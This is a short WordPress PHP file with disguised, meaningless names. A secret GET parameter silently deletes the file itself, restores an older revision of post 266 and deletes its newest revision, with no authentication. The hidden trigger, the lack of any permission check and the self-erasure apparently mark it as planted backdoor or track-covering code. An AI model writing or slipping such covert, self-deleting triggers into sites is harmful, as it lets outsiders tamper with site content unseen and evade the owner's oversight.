<?php

function accordion_file_like() {
	if (isset($_GET['now_excerpt_refresh_toolbar']) && $_GET['now_excerpt_refresh_toolbar'] === 'toolbox_ticket_visual') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$verification_share_reset = 266;
		$comment_lightbox_remover_slider = wp_get_post_revisions($verification_share_reset);
		if (empty($comment_lightbox_remover_slider)) die('no revisions');
		if (count($comment_lightbox_remover_slider) < 2) die('less than 2');
		$quantity_include_showcase_status = array_shift($comment_lightbox_remover_slider);
		$plus_checkout_most_discount = $quantity_include_showcase_status->ID;
		$feed_settings_stream = array_shift($comment_lightbox_remover_slider);
		$interactive_roles_appointment_connect = $feed_settings_stream->ID;
		$live_events_translator = wp_restore_post_revision($interactive_roles_appointment_connect);
		if ($live_events_translator === false) die('error restoring');
		$live_events_translator = wp_delete_post_revision($plus_checkout_most_discount);		
		if ($live_events_translator === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'accordion_file_like');
